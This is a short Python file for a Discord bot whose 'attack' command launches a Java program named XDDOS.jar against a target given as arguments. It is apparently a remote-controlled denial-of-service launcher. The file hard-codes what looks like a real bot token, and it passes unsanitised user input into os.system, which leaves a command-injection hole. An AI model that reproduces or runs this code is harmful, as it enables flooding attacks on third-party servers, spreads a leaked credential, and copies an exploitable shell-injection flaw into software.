import json
from urllib.request import urlopen
import discord
import threading
from discord.ext import commands
import os
import random
token = "MTA0ODEyODI1ODk0MTY2NTM3MQ.GVQz0j.SyKfqBXhN2f0CxBuRkcDdWIB39VSmXII9ByzjI"
client = commands.Bot(command_prefix='xd!',intents=discord.Intents.all()) 
client.remove_command('help')
@client.command()
async def attack(ctx, arg1, arg2, arg3):
    os.system(f'screen -d -m java -jar XDDOS.jar {arg1} {arg2} {arg3} 120 -1 y')
client.run(token)